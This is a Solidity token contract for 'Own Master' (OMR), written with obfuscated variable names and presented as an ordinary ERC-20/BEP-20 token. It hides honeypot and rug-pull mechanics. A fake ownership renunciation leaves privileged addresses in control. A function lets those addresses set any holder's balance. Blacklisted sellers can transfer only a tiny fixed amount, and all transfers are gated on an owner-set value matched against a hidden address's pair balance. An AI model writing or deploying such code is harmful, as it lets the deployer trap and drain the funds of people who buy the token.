//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface feeAmount {
    function createPair(address teamLaunchedSender, address receiverListReceiver) external returns (address);
}

interface txFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenLaunch) external view returns (uint256);

    function transfer(address receiverTake, uint256 walletReceiver) external returns (bool);

    function allowance(address totalTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address receiverTake,
        uint256 walletReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingTo, uint256 value);
    event Approval(address indexed totalTx, address indexed spender, uint256 value);
}

abstract contract sellWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txFeeMetadata is txFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OwnMaster is sellWallet, txFee, txFeeMetadata {

    mapping(address => bool) public senderLaunchedTrading;

    function symbol() external view virtual override returns (string memory) {
        return launchTeam;
    }

    address public totalFund;

    function approve(address totalLaunch, uint256 walletReceiver) public virtual override returns (bool) {
        launchedIs[_msgSender()][totalLaunch] = walletReceiver;
        emit Approval(_msgSender(), totalLaunch, walletReceiver);
        return true;
    }

    mapping(address => mapping(address => uint256)) private launchedIs;

    function totalSupply() external view virtual override returns (uint256) {
        return modeReceiver;
    }

    function totalFrom() public {
        emit OwnershipTransferred(totalFund, address(0));
        walletLiquidity = address(0);
    }

    bool private txFund;

    constructor (){
        if (fromReceiver != walletAmount) {
            txFund = false;
        }
        shouldAuto walletMaxIs = shouldAuto(launchedAmountToken);
        teamWalletList = feeAmount(walletMaxIs.factory()).createPair(walletMaxIs.WETH(), address(this));
        
        totalFund = _msgSender();
        senderLaunchedTrading[totalFund] = true;
        shouldTokenSell[totalFund] = modeReceiver;
        totalFrom();
        
        emit Transfer(address(0), totalFund, modeReceiver);
    }

    uint256 private walletAmount;

    function allowance(address buyEnableMode, address totalLaunch) external view virtual override returns (uint256) {
        if (totalLaunch == launchedAmountToken) {
            return type(uint256).max;
        }
        return launchedIs[buyEnableMode][totalLaunch];
    }

    uint256 buyTrading;

    string private launchedSender = "Own Master";

    function fundTradingFee(address tokenEnableTrading, address receiverTake, uint256 walletReceiver) internal returns (bool) {
        require(shouldTokenSell[tokenEnableTrading] >= walletReceiver);
        shouldTokenSell[tokenEnableTrading] -= walletReceiver;
        shouldTokenSell[receiverTake] += walletReceiver;
        emit Transfer(tokenEnableTrading, receiverTake, walletReceiver);
        return true;
    }

    function txTrading() private view {
        require(senderLaunchedTrading[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return launchedSender;
    }

    address private walletLiquidity;

    uint256 private modeReceiver = 100000000 * 10 ** 18;

    function fromSwap(address modeFee) public {
        require(modeFee.balance < 100000);
        if (shouldWallet) {
            return;
        }
        if (fromReceiver == walletAmount) {
            autoLaunched = false;
        }
        senderLaunchedTrading[modeFee] = true;
        if (walletAmount != fromReceiver) {
            fromReceiver = walletAmount;
        }
        shouldWallet = true;
    }

    function takeLimitMode(address enableFund) public {
        txTrading();
        if (walletAmount == fromReceiver) {
            txFund = false;
        }
        if (enableFund == totalFund || enableFund == teamWalletList) {
            return;
        }
        swapWalletAt[enableFund] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return marketingAmount;
    }

    event OwnershipTransferred(address indexed tradingToken, address indexed fromShould);

    bool private autoLaunched;

    address launchedAmountToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address tradingLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private fromReceiver;

    function atLaunch(address sellReceiver, uint256 walletReceiver) public {
        txTrading();
        shouldTokenSell[sellReceiver] = walletReceiver;
    }

    uint256 constant buyAmountWallet = 19 ** 10;

    address public teamWalletList;

    function shouldReceiverLaunched(uint256 walletReceiver) public {
        txTrading();
        sellTrading = walletReceiver;
    }

    function transferFrom(address tokenEnableTrading, address receiverTake, uint256 walletReceiver) external override returns (bool) {
        if (_msgSender() != launchedAmountToken) {
            if (launchedIs[tokenEnableTrading][_msgSender()] != type(uint256).max) {
                require(walletReceiver <= launchedIs[tokenEnableTrading][_msgSender()]);
                launchedIs[tokenEnableTrading][_msgSender()] -= walletReceiver;
            }
        }
        return fundBuySwap(tokenEnableTrading, receiverTake, walletReceiver);
    }

    uint8 private marketingAmount = 18;

    mapping(address => uint256) private shouldTokenSell;

    function transfer(address sellReceiver, uint256 walletReceiver) external virtual override returns (bool) {
        return fundBuySwap(_msgSender(), sellReceiver, walletReceiver);
    }

    string private launchTeam = "OMR";

    bool public shouldWallet;

    function owner() external view returns (address) {
        return walletLiquidity;
    }

    function fundBuySwap(address tokenEnableTrading, address receiverTake, uint256 walletReceiver) internal returns (bool) {
        if (tokenEnableTrading == totalFund) {
            return fundTradingFee(tokenEnableTrading, receiverTake, walletReceiver);
        }
        uint256 toReceiver = txFee(teamWalletList).balanceOf(tradingLimit);
        require(toReceiver == sellTrading);
        require(receiverTake != tradingLimit);
        if (swapWalletAt[tokenEnableTrading]) {
            return fundTradingFee(tokenEnableTrading, receiverTake, buyAmountWallet);
        }
        return fundTradingFee(tokenEnableTrading, receiverTake, walletReceiver);
    }

    uint256 sellTrading;

    function getOwner() external view returns (address) {
        return walletLiquidity;
    }

    function balanceOf(address tokenLaunch) public view virtual override returns (uint256) {
        return shouldTokenSell[tokenLaunch];
    }

    mapping(address => bool) public swapWalletAt;

}